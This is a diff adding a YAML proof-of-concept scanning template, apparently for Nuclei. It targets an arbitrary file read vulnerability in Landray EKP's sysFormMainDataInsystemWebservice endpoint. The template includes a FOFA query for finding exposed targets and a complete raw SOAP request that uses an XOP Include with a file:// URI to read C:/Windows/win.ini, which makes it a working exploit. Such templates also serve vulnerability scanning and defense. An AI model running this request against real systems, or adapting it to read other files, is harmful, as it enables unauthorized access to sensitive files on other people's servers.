@@ -1,0 +1,19 @@
+id: poc-wvhlx5wv386gtvgs
+info:
+  name: 蓝凌EKP系统接口sysFormMainDataInsystemWebservice存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wvhlx5wv386gtvgs'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wvhlx5wv386gtvgs
+    fofa: body="Com_Parameter"
+http:
+- raw:
+  - "POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\nConnection: close\nContent-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz\nSOAPAction: \"\"\nAccept-Encoding: gzip, deflate\n\n------4upt9dwdca8rtwq9osuz\nContent-Disposition: form-data; name=\"a\"\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\n<soapenv:Header/>\n<soapenv:Body>\n    <web:getData>\n        <arg0>\n            <beginTimeStamp>a</beginTimeStamp>\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\n        </arg0>\n    </web:getData>\n</soapenv:Body>\n</soapenv:Envelope>\n------4upt9dwdca8rtwq9osuz--"
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
